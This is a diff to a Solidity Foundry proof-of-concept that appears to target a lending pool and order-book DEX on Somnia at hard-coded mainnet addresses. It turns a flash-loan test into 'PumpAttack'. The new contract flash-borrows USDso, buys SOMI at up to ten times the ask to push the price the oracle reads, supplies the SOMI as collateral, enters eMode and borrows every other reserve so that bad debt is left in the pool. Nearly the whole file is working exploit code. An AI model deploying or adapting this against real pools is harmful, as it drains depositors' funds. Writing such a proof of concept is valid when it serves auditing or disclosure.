@@ -15,8 +15,6 @@ interface IWrappedNative {
 
 interface IAaveOracle {
     function getAssetPrice(address) external view returns (uint256);
-    function getSourceOfAsset(address) external view returns (address);
-    function FLASHLOAN_PREMIUM_TOTAL() external view returns (uint256);
 }
 
 interface IPool {
@@ -25,6 +23,8 @@ interface IPool {
     function supply(address, uint256, address, uint16) external;
     function borrow(address, uint256, uint256, uint16, address) external;
     function getConfiguration(address) external view returns (uint256);
+    function getUserEMode(address) external view returns (uint256);
+    function setUserEMode(uint8) external;
     function getUserAccountData(address)
         external
         view
@@ -46,43 +46,87 @@ interface IClob {
         external
         payable
         returns (bool, uint128);
+    function getWithdrawableBalance(address, address) external view returns (uint256);
+    function withdraw(address, uint256) external returns (bool);
 }
 
-/// @dev Everything the run measured, carried out of the transaction in the revert payload.
-///      A revert rolls back storage, so reading these back through view getters afterwards
-///      returns zeros - that is the trap this struct avoids.
+/// @dev Aave v3 packed reserve configuration, decoded field by field.
+library Cfg {
+    function ltv(uint256 c) internal pure returns (uint256) {
+        return c & 0xffff;
+    }
+    function liqThreshold(uint256 c) internal pure returns (uint256) {
+        return (c >> 16) & 0xffff;
+    }
+    function decimals(uint256 c) internal pure returns (uint256) {
+        return (c >> 48) & 0xff;
+    }
+    function active(uint256 c) internal pure returns (bool) {
+        return ((c >> 56) & 1) == 1;
+    }
+    function frozen(uint256 c) internal pure returns (bool) {
+        return ((c >> 57) & 1) == 1;
+    }
+    function borrowEnabled(uint256 c) internal pure returns (bool) {
+        return ((c >> 58) & 1) == 1;
+    }
+    function borrowCap(uint256 c) internal pure returns (uint256) {
+        return (c >> 80) & 0xfffffffff; // 36 bits
+    }
+    function supplyCap(uint256 c) internal pure returns (uint256) {
+        return (c >> 116) & 0xfffffffff; // 36 bits
+    }
+    function eMode(uint256 c) internal pure returns (uint256) {
+        return (c >> 168) & 0xff;
+    }
+}
+
+/// @dev Every number the run produced, carried out of the transaction through a revert payload.
+///      Compare with reading getters afterwards: a revert rolls storage back and those read zero.
 struct Metrics {
     uint256 flashAmount;
-    uint256 premiumBps;
     uint256 repayment;
     uint256 oracleBefore;
     uint256 oracleAfter;
     uint256 askBefore;
     uint256 askAfter;
-    uint256 bidBefore;
-    uint256 bidAfter;
+    uint256 pumpLimit; // the price the buy was allowed to cross up to
     uint256 somiBought;
     uint256 usdsoSpent;
-    uint256 execPrice; // USDso per SOMI, 18 decimals
+    uint256 execPrice; // USDso per SOMI, 18 dp
     uint256 supplied;
-    uint256 ltvBps;
-    uint256 borrowPowerUsdso; // converted out of the 8-decimal Aave base
-    uint256 borrowedUsdso;
-    uint256 unspentUsdso; // flash principal never spent on the book
-    uint256 availableUsdso; // everything actually on hand at repayment time
-    uint256 coverageBps; // available / repayment, 10_000 = exactly solvent
-    uint256 shortfall;
-    int256 edgeRealizedBps; // + = bought below oracle, - = bought above
-    uint256 edgeRequiredBps; // what the LTV arithmetic demands
+    uint256 borrowPowerUsdso; // from getUserAccountData, converted out of 8 dp
+    uint256 borrowedUsdsoValue; // USD value of every reserve successfully borrowed
+    uint256 leftoverUsdso;
+    uint256 extractedUsdso; // leftover + borrowed value: what walks out of the pool
+    uint256 coverageBps; // extracted / flash repayment
+    uint256 badDebtUsdso; // debt left behind in the pool
+    int256 edgeRealizedBps;
+    uint256 edgeRequiredBps;
+    uint8 legsTried;
+    uint8 legsBorrowed;
+    uint8 legsBlocked; // rejected by config / cap / cash
+    uint8 borrowedEra; // user eMode actually set
 }
 
-/// @notice Zero-seed: flash USDso -> IOC buy SOMI on dreamDEX -> wrap -> supply WSOMI ->
-///         borrow max USDso -> repay the flash, all inside one transaction.
-contract Attack {
+/// @notice The bZx / Mango template, verbatim:
+///         1. flash borrow USDso
+///         2. spend it into the SOMI/USDso book with NO price ceiling worth respecting, so the
+///            marginal price is dragged up as far as the book allows
+///         3. wrap and supply the SOMI acquired
+///         4. borrow EVERY other reserve the account is allowed to borrow, not just USDso
+///         5. walk away with the borrowed assets, leaving the debt behind as bad debt
+///
+///         The only thing that decides whether this pays is whether step 2 moves the price the
+///         lending oracle reads. Everything else is bookkeeping.
+contract PumpAttack {
     address constant POOL = 0xEC6758e6324c167DB39B6908036240460a2b0168;
     address constant ORACLE = 0x9b7B5d69a08071ce74C2f3D655038E3b782eAaFc;
     address constant WSOMI = 0x046EDe9564A72571df6F5e44d0405360c0f4dCab;
     address constant USDSO = 0x00000022dA000002656c64D9eA6011ea952D008A;
+    address constant USDC = 0x28BEc7E30E6faee657a03e19Bf1128AaD7632A00;
+    address constant WETH = 0x936Ab8C674bcb567CD5dEB85D8A216494704E9D8;
+    address constant WBTC = 0xC5098b3cA516784323872F17235fa074E167D3D2;
     address constant MARKET = 0x035De7403eac6872787779CCA7CCF1b4CDb61379;
 
     uint256 constant BPS = 10_000;
@@ -92,20 +136,23 @@ contract Attack {
     address public immutable owner = msg.sender;
 
     Metrics internal m;
-    uint256 internal limitBps;
+    uint256 internal pumpBps;
 
     error Shortfall(Metrics m);
+    error Leg(address asset, bytes inner);
 
-    function run(uint256 amount, uint256 limitBps_) external {
+    modifier onlySelf() {
+        require(msg.sender == address(this), "self only");
+        _;
+    }
+
+    function run(uint256 amount, uint256 pumpBps_) external {
         require(msg.sender == owner, "owner");
-        limitBps = limitBps_;
+        pumpBps = pumpBps_;
         m.flashAmount = amount;
-        m.premiumBps = IPool(POOL).FLASHLOAN_PREMIUM_TOTAL();
-        m.repayment = amount + (amount * m.premiumBps) / BPS;
+        m.repayment = amount + (amount * IPool(POOL).FLASHLOAN_PREMIUM_TOTAL()) / BPS;
         m.oracleBefore = IAaveOracle(ORACLE).getAssetPrice(WSOMI);
-        m.bidBefore = _best(true);
         m.askBefore = _best(false);
-
         IPool(POOL).flashLoanSimple(address(this), USDSO, amount, "", 0);
     }
 
@@ -116,83 +163,164 @@ contract Attack {
         require(msg.sender == POOL && initiator == address(this), "only pool");
         require(asset == USDSO && amount == m.flashAmount && premium == m.repayment - m.flashAmount, "bad flash");
 
-        _buy(amount);
-        _supplyAndBorrow();
-        _settle(amount);
+        _pump(amount);
+        _supplyCollateral();
+        _borrowEverything();
+        _settle();
         return true;
     }
 
-    // ---- 1. real IOC buy of native SOMI against the live ask book ----
-    function _buy(uint256 amount) internal {
+    // ---- 1+2. spend the flash into the book, cross as far up as the book goes ----
+    function _pump(uint256 amount) internal {
         (,,,, uint256 tick, uint256 minQty, uint256 lot) = IClob(MARKET).getPoolParams();
-        uint256 limit = ((m.askBefore * limitBps) / BPS / tick) * tick + tick;
-        uint256 qty = _sizeBuy(limit, amount, lot);
+        m.pumpLimit = ((m.askBefore * pumpBps) / BPS / tick) * tick + tick;
+
+        uint256 qty = _sizeBuy(m.pumpLimit, amount, lot);
         if (qty == 0 || qty < minQty) _fail();
 
-        (address input, uint256 required,) = IClob(MARKET).getAutoPullRequirement(address(this), true, limit, qty, 0);
+        (address input, uint256 required,) =
+            IClob(MARKET).getAutoPullRequirement(address(this), true, m.pumpLimit, qty, 0);
         if (input != USDSO || required > amount) _fail();
         IERC20(USDSO).approve(MARKET, required);
 
         uint256 nativeBefore = address(this).balance;
         uint256 quoteBefore = IERC20(USDSO).balanceOf(address(this));
         (bool ok,) = IClob(MARKET).placeOrder(
-            true, 0, limit, qty, uint64((block.timestamp + 300) * 1e9), IOC, SELF_CANCEL_TAKER, address(0), 0
+            true, 0, m.pumpLimit, qty, uint64((block.timestamp + 300) * 1e9), IOC, SELF_CANCEL_TAKER, address(0), 0
         );
         if (!ok) _fail();
+
+        // The fill can land in the wallet or in the pool's internal vault; pull it if needed.
+        if (address(this).balance == nativeBefore) {
+            uint256 vaulted = IClob(MARKET).getWithdrawableBalance(address(this), address(0));
+            if (vaulted > 0) {
+                try IClob(MARKET).withdraw(address(0), vaulted) {} catch {}
+            }
+        }
+
         m.somiBought = address(this).balance - nativeBefore;
         m.usdsoSpent = quoteBefore - IERC20(USDSO).balanceOf(address(this));
         if (m.somiBought == 0 || m.usdsoSpent == 0) _fail();
         m.execPrice = (m.usdsoSpent * 1e18) / m.somiBought;
 
-        // 2. same-transaction oracle reread, after the trade
         m.oracleAfter = IAaveOracle(ORACLE).getAssetPrice(WSOMI);
         m.askAfter = _best(false);
-        m.bidAfter = _best(true);
     }
 
-    // ---- 3+4. wrap, supply, borrow the maximum of the reserve the flash must be repaid in ----
-    function _supplyAndBorrow() internal {
+    // ---- 3. wrap and supply ----
+    function _supplyCollateral() internal {
         IWrappedNative(WSOMI).deposit{value: m.somiBought}();
         m.supplied = m.somiBought;
         IERC20(WSOMI).approve(POOL, m.somiBought);
         IPool(POOL).supply(WSOMI, m.somiBought, address(this), 0);
-        m.ltvBps = IPool(POOL).getConfiguration(WSOMI) & 0xffff;
-
         (,, uint256 available,,,) = IPool(POOL).getUserAccountData(address(this));
-        // Aave reports the base currency with 8 decimals; keep the 18-decimal side too so the
-        // coverage arithmetic never mixes units again.
         m.borrowPowerUsdso = available * 1e10;
-
-        uint256 price = IAaveOracle(ORACLE).getAssetPrice(USDSO);
-        uint256 budget = available - (available / 1_000_000) - 1; // HF guard epsilon
-        m.borrowedUsdso = (budget * 1e18) / price;
-        if (m.borrowedUsdso > 0) IPool(POOL).borrow(USDSO, m.borrowedUsdso, 2, 0, address(this));
     }
 
-    // ---- 5. price the repayment, then repay or report exactly how short ----
-    function _settle(uint256 amount) internal {
+    // ---- 4. every other reserve, maxed against cash, borrow cap and remaining power ----
+    function _borrowEverything() internal {
+        // If the deployment puts any reserve in an eMode, entering it can raise the LTV. Skipping
+        // this check is how an "impossible" borrow quietly becomes possible.
+        address[5] memory assets = [USDSO, USDC, WETH, WBTC, WSOMI];
+        for (uint256 i; i < assets.length; ++i) {
+            uint256 category = Cfg.eMode(IPool(POOL).getConfiguration(assets[i]));
+            if (category != 0 && m.borrowedEra == 0) {
+                try IPool(POOL).setUserEMode(uint8(category)) {
+                    m.borrowedEra = uint8(category);
+                    console2.log("  entered eMode category", category);
+                } catch {
+                    console2.log("  eMode set rejected, category", category);
+                }
+            }
+        }
+
+        for (uint256 i; i < assets.length; ++i) {
+            address a = assets[i];
+            if (a == WSOMI) continue; // our own collateral
+            m.legsTried++;
+            uint256 config = IPool(POOL).getConfiguration(a);
+            if (!Cfg.active(config) || Cfg.frozen(config) || !Cfg.borrowEnabled(config)) {
+                m.legsBlocked++;
+                continue;
+            }
+
+            uint256 price = IAaveOracle(ORACLE).getAssetPrice(a);
+            if (price == 0) {
+                m.legsBlocked++;
+                continue;
+            }
+            uint8 dec = IERC20(a).decimals();
+
+            (,, uint256 available,,,) = IPool(POOL).getUserAccountData(address(this));
+            if (available == 0) {
+                m.legsBlocked++;
+                continue;
+            }
+            uint256 budget = available - (available / 1_000_000) - 1;
+            uint256 amount = (budget * (10 ** dec)) / price;
+
+            // borrow cap, in whole tokens
+            uint256 cap = Cfg.borrowCap(config);
+            if (cap != 0) {
+                uint256 capAmount = cap * (10 ** dec);
+                if (amount > capAmount) amount = capAmount;
+            }
+
+            if (amount == 0) {
+                m.legsBlocked++;
+                continue;
+            }
+
+            try this.borrowLeg(a, amount) {
+                m.legsBorrowed++;
+                m.borrowedUsdsoValue += _value18(amount, price, dec);
+                m.badDebtUsdso += _value18(amount, price, dec);
+                console2.log("  borrowed", a);
+                console2.log("    amount", amount);
+                console2.log("    value18", _value18(amount, price, dec));
+                console2.log("    cap", cap);
+            } catch (bytes memory inner) {
+                m.legsBlocked++;
+                console2.log("  borrow leg REVERTED", a);
+                console2.log("    wanted", amount);
+                _logRevert(inner);
+            }
+        }
+    }
+
+    /// @dev External so a reserve that refuses can be observed instead of aborting the whole run.
+    function borrowLeg(address asset, uint256 amount) external onlySelf {
+        IPool(POOL).borrow(asset, amount, 2, 0, address(this));
+    }
+
+    // ---- 5. everything that walks out vs the flash that must go back ----
+    function _settle() internal {
         uint256 have = IERC20(USDSO).balanceOf(address(this));
-        m.unspentUsdso = amount > m.usdsoSpent ? amount - m.usdsoSpent : 0;
-        m.availableUsdso = have;
-        m.coverageBps = (have * BPS) / m.repayment;
+        m.leftoverUsdso = have;
+        m.extractedUsdso = have + m.borrowedUsdsoValue;
+        m.coverageBps = (m.extractedUsdso * BPS) / m.repayment;
         m.edgeRealizedBps = _edge(m.oracleBefore, m.execPrice);
-        m.edgeRequiredBps = m.ltvBps == 0 ? type(uint256).max : ((BPS + m.premiumBps) * BPS) / m.ltvBps - BPS;
+        m.edgeRequiredBps = ((BPS + (m.repayment - m.flashAmount) * BPS / m.flashAmount) * BPS) / 6_000 - BPS;
 
         if (have < m.repayment) {
-            m.shortfall = m.repayment - have;
+            m.badDebtUsdso = m.repayment - have;
             _fail();
         }
+        // Repaid the flash: the borrowed reserves are the profit, held against pool debt.
+        m.badDebtUsdso = m.borrowedUsdsoValue;
         IERC20(USDSO).approve(POOL, m.repayment);
     }
 
-    /// @dev signed edge of the executed price against the oracle: positive means we bought cheap.
+    function _value18(uint256 amount, uint256 price8, uint8 dec) internal pure returns (uint256) {
+        return (amount * price8 * 1e10) / (10 ** dec);
+    }
+
     function _edge(uint256 oracle8, uint256 exec18) internal pure returns (int256) {
         if (oracle8 == 0) return 0;
         int256 o = int256(oracle8 * 1e10);
         return ((o - int256(exec18)) * int256(BPS)) / o;
     }
 
-    /// @dev Revert with the metrics instead of a bare error, so a losing run still measures.
     function _fail() internal view {
         revert Shortfall(m);
     }
@@ -229,6 +357,22 @@ contract Attack {
         return 0;
     }
 
+    function _logRevert(bytes memory err) internal pure {
+        if (err.length < 4) {
+            console2.log("    no revert data");
+            return;
+        }
+        bytes4 sel;
+        assembly {
+            sel := mload(add(err, 32))
+        }
+        bytes memory body = new bytes(err.length - 4);
+        for (uint256 i; i < body.length; ++i) body[i] = err[i + 4];
+        if (sel == 0x08c379a0) console2.log("    Error(string)", abi.decode(body, (string)));
+        else if (sel == 0x4e487b71) console2.log("    Panic", abi.decode(body, (uint256)));
+        else console2.log("    custom error sel", uint32(sel));
+    }
+
     receive() external payable {}
 }
 
@@ -236,85 +380,99 @@ contract SomniaPoC is Test {
     address constant POOL = 0xEC6758e6324c167DB39B6908036240460a2b0168;
     address constant WSOMI = 0x046EDe9564A72571df6F5e44d0405360c0f4dCab;
     address constant USDSO = 0x00000022dA000002656c64D9eA6011ea952D008A;
+    address constant USDC = 0x28BEc7E30E6faee657a03e19Bf1128AaD7632A00;
+    address constant WETH = 0x936Ab8C674bcb567CD5dEB85D8A216494704E9D8;
+    address constant WBTC = 0xC5098b3cA516784323872F17235fa074E167D3D2;
+    address constant ORACLE = 0x9b7B5d69a08071ce74C2f3D655038E3b782eAaFc;
     address constant MARKET = 0x035De7403eac6872787779CCA7CCF1b4CDb61379;
 
     uint256 constant BPS = 10_000;
 
-    /// @dev The fork comes from the command line, not from here: one source of truth for the block.
     function setUp() public view {
         require(block.chainid == 5031, "not Somnia: pass --fork-url and --fork-block-number");
     }
 
     function test_attack() public {
         console2.log("block", block.number);
-        _gate(WSOMI, "SOMI");
-        _gate(USDSO, "USDso");
-        _depth();
+        _reserves();
+        _book();
+
+        if (vm.envOr("PINNED_ONLY", false)) return;
         _sweep();
     }
 
-    // ---------------------------------------------------------------- sweep
+    /// @notice Every reserve as the pool itself sees it: LTV, caps, cash, eMode. This is the
+    ///         ground truth for what "borrow the other tokens" can possibly mean.
+    function _reserves() internal view {
+        address[5] memory assets = [USDSO, USDC, WETH, WBTC, WSOMI];
+        string[5] memory names = ["USDso", "USDC.e", "WETH", "WBTC", "WSOMI"];
+        for (uint256 i; i < assets.length; ++i) {
+            uint256 c = IPool(POOL).getConfiguration(assets[i]);
+            console2.log("--- reserve", names[i]);
+            console2.log("  ltv", Cfg.ltv(c));
+            console2.log("  liqThreshold", Cfg.liqThreshold(c));
+            console2.log("  decimals", Cfg.decimals(c));
+            console2.log("  active/frozen/borrowable", Cfg.active(c));
+            console2.log("  borrowable", Cfg.borrowEnabled(c));
+            console2.log("  borrowCap", Cfg.borrowCap(c));
+            console2.log("  supplyCap", Cfg.supplyCap(c));
+            console2.log("  eMode category", Cfg.eMode(c));
+            console2.log("  oracle price", IAaveOracle(ORACLE).getAssetPrice(assets[i]));
+        }
+        console2.log("user eMode", IPool(POOL).getUserEMode(address(this)));
+    }
 
-    /// @notice Run the whole attack at several flash sizes. Every attempt that cannot repay
-    ///         reverts and is rolled back, so each size starts from the same untouched fork.
+    function _book() internal view {
+        IClob.Level[] memory asks = IClob(MARKET).getBookLevels(false, 20);
+        if (asks.length == 0) return;
+        uint256 notional;
+        for (uint256 i; i < asks.length; ++i) notional += (asks[i].price * asks[i].quantity) / 1e18;
+        console2.log("--- book");
+        console2.log("  ask levels", asks.length);
+        console2.log("  best ask", asks[0].price);
+        console2.log("  worst ask", asks[asks.length - 1].price);
+        console2.log("  USDso to clear every level", notional);
+    }
+
     function _sweep() internal {
-        uint256[] memory sizes = _sizes();
-        uint256 bestCov;
+        uint256[4] memory sizes = [
+            vm.envOr("FLASH_1", uint256(35_000e18)),
+            vm.envOr("FLASH_2", uint256(50_000e18)),
+            vm.envOr("FLASH_3", uint256(120_000e18)),
+            vm.envOr("FLASH_4", uint256(0))
+        ];
+        uint256 best;
         uint256 bestSize;
-        uint256 bestRepay;
 
         for (uint256 i; i < sizes.length; ++i) {
+            if (sizes[i] == 0) continue;
             (Metrics memory m, bool repaid) = _attempt(sizes[i]);
             if (m.flashAmount == 0) {
-                console2.log("  size", sizes[i], "reverted without metrics");
+                console2.log("  size reverted without metrics", sizes[i]);
                 continue;
             }
-            console2.log("=== FLASH USDso", sizes[i]);
-            _report(m);
-            console2.log("  REPAID?", repaid);
-            if (m.coverageBps > bestCov) {
-                bestCov = m.coverageBps;
+            console2.log("=== PUMP with flash USDso", sizes[i]);
+            _report(m, repaid);
+            if (m.coverageBps > best) {
+                best = m.coverageBps;
                 bestSize = sizes[i];
-                bestRepay = m.repayment;
             }
         }
 
         console2.log("=== SUMMARY");
-        console2.log("  best coverage bps", bestCov);
-        console2.log("  at flash size USDso", bestSize);
-        console2.log("  repayment due at that size", bestRepay);
-        console2.log("  break even needs bps", BPS);
-        console2.log("  still short by bps", bestCov >= BPS ? 0 : BPS - bestCov);
-        console2.log("  verdict", bestCov >= BPS ? "PROFITABLE" : "UNPROFITABLE AT EVERY SIZE");
+        console2.log("  best coverage bps", best);
+        console2.log("  at flash size", bestSize);
+        console2.log("  break even bps", BPS);
+        console2.log("  verdict", best >= BPS ? "DRAINABLE" : "PUMP DOES NOT MOVE THE ORACLE");
     }
 
-    /// @dev FLASH_USDSO pins a single size; otherwise the ladder below is used.
-    function _sizes() internal view returns (uint256[] memory s) {
-        uint256 pinned = vm.envOr("FLASH_USDSO", uint256(0));
-        if (pinned > 0) {
-            s = new uint256[](1);
-            s[0] = pinned;
-            return s;
-        }
-        s = new uint256[](6);
-        s[0] = 100e18;
-        s[1] = 500e18;
-        s[2] = 1_000e18;
-        s[3] = 5_000e18;
-        s[4] = 25_000e18;
-        s[5] = 100_000e18;
-    }
-
-    /// @dev One attempt. Returns the metrics either way; the second flag says whether the
-    ///      flash was actually repaid inside the call.
     function _attempt(uint256 amount) internal returns (Metrics memory m, bool repaid) {
-        Attack a = new Attack();
-        try a.run(amount, vm.envOr("LIMIT_BPS", uint256(10_050))) {
+        PumpAttack a = new PumpAttack();
+        uint256 pumpBps = vm.envOr("PUMP_BPS", uint256(100_000)); // 10x: do not respect the book
+        try a.run(amount, pumpBps) {
             return (a.metrics(), true);
         } catch (bytes memory err) {
-            Metrics memory got = _decode(err);
-            if (got.flashAmount == 0) _explain(err);
-            return (got, false);
+            return (_decode(err), false);
         }
     }
 
@@ -324,104 +482,46 @@ contract SomniaPoC is Test {
         assembly {
             sel := mload(add(err, 32))
         }
-        if (sel != Attack.Shortfall.selector) return m;
+        if (sel != PumpAttack.Shortfall.selector) return m;
         bytes memory body = new bytes(err.length - 4);
         for (uint256 i; i < body.length; ++i) body[i] = err[i + 4];
         return abi.decode(body, (Metrics));
     }
 
-    /// @dev A revert that did not carry Metrics is still information: print the selector and,
-    ///      when it is a standard Error(string), the reason. Otherwise say where it came from.
-    function _explain(bytes memory err) internal {
-        if (err.length < 4) {
-            console2.log("  revert with no data (or out of gas at this size)");
-            return;
-        }
-        bytes4 sel;
-        assembly {
-            sel := mload(add(err, 32))
-        }
-        console2.log("  revert selector", uint32(sel));
-        bytes memory body = new bytes(err.length - 4);
-        for (uint256 i; i < body.length; ++i) body[i] = err[i + 4];
-        if (sel == 0x08c379a0) {
-            // Error(string)
-            console2.log("  Error(string):", abi.decode(body, (string)));
-        } else if (sel == 0x4e487b71) {
-            // Panic(uint256)
-            console2.log("  Panic(uint256):", abi.decode(body, (uint256)));
-        } else {
-            console2.log("  custom error, payload bytes", body.length);
-        }
-    }
-
-    // ---------------------------------------------------------------- report
-
-    function _report(Metrics memory m) internal pure {
+    function _report(Metrics memory m, bool repaid) internal pure {
         console2.log("--- flash");
-        console2.log("  principal USDso", m.flashAmount);
-        console2.log("  premium bps", m.premiumBps);
-        console2.log("  repayment due USDso", m.repayment);
+        console2.log("  principal", m.flashAmount);
+        console2.log("  repayment due", m.repayment);
 
-        console2.log("--- fill");
+        console2.log("--- pump");
+        console2.log("  pump limit price", m.pumpLimit);
         console2.log("  best ask before", m.askBefore);
         console2.log("  best ask after ", m.askAfter);
-        console2.log("  ASK MOVE BPS", _move(m.askBefore, m.askAfter));
-        console2.log("  best bid before", m.bidBefore);
-        console2.log("  best bid after ", m.bidAfter);
-        console2.log("  SOMI bought (wei)", m.somiBought);
+        console2.log("  SOMI bought", m.somiBought);
         console2.log("  USDso spent", m.usdsoSpent);
-        console2.log("  realized exec price (USDso per SOMI)", m.execPrice);
+        console2.log("  exec price", m.execPrice);
 
         console2.log("--- oracle");
         console2.log("  before", m.oracleBefore);
         console2.log("  after ", m.oracleAfter);
         console2.log("  ORACLE MOVE BPS", _move(m.oracleBefore, m.oracleAfter));
 
-        console2.log("--- collateral");
+        console2.log("--- borrow");
         console2.log("  supplied WSOMI", m.supplied);
-        console2.log("  ltv bps", m.ltvBps);
         console2.log("  borrow power USDso", m.borrowPowerUsdso);
+        console2.log("  legs tried", m.legsTried);
+        console2.log("  legs borrowed", m.legsBorrowed);
+        console2.log("  legs blocked", m.legsBlocked);
+        console2.log("  borrowed value USDso", m.borrowedUsdsoValue);
 
-        console2.log("--- repayment");
-        console2.log("  borrowed USDso", m.borrowedUsdso);
-        console2.log("  unspent flash USDso", m.unspentUsdso);
-        console2.log("  available USDso", m.availableUsdso);
-        console2.log("  shortfall USDso", m.shortfall);
-
-        console2.log("--- verdict");
+        console2.log("--- drain");
+        console2.log("  extracted USDso", m.extractedUsdso);
+        console2.log("  repayment needed", m.repayment);
+        console2.log("  bad debt left in pool", m.badDebtUsdso);
         console2.log("  COVERAGE bps", m.coverageBps);
         console2.log("  EDGE REALIZED bps", m.edgeRealizedBps);
         console2.log("  EDGE REQUIRED bps", m.edgeRequiredBps);
-    }
-
-    /// @notice edge required = (1 + flash premium) / LTV - 1: the discount the trade must buy at.
-    function _gate(address asset, string memory label) internal view {
-        uint256 cfg = IPool(POOL).getConfiguration(asset);
-        uint256 ltv = cfg & 0xffff;
-        uint256 threshold = (cfg >> 16) & 0xffff;
-        uint256 prem = IPool(POOL).FLASHLOAN_PREMIUM_TOTAL();
-        console2.log("--- gate", label);
-        console2.log("  ltv bps", ltv);
-        console2.log("  liquidation threshold bps", threshold);
-        console2.log("  EDGE REQUIRED bps", ltv == 0 ? type(uint256).max : ((BPS + prem) * BPS) / ltv - BPS);
-        console2.log("  oracle price", IAaveOracle(0x9b7B5d69a08071ce74C2f3D655038E3b782eAaFc).getAssetPrice(asset));
-    }
-
-    /// @notice how much USDso it takes to walk the ask book, and how far it walks.
-    function _depth() internal view {
-        IClob.Level[] memory asks = IClob(MARKET).getBookLevels(false, 20);
-        if (asks.length == 0) return;
-        uint256 notional;
-        for (uint256 i; i < asks.length; ++i) notional += (asks[i].price * asks[i].quantity) / 1e18;
-        uint256 best = asks[0].price;
-        uint256 worst = asks[asks.length - 1].price;
-        console2.log("--- depth");
-        console2.log("  ask levels", asks.length);
-        console2.log("  best ask", best);
-        console2.log("  worst ask", worst);
-        console2.log("  walk bps", ((worst - best) * BPS) / best);
-        console2.log("  cumulative USDso needed", notional);
+        console2.log("  REPAID?", repaid);
     }
 
     function _move(uint256 before_, uint256 after_) internal pure returns (uint256) {
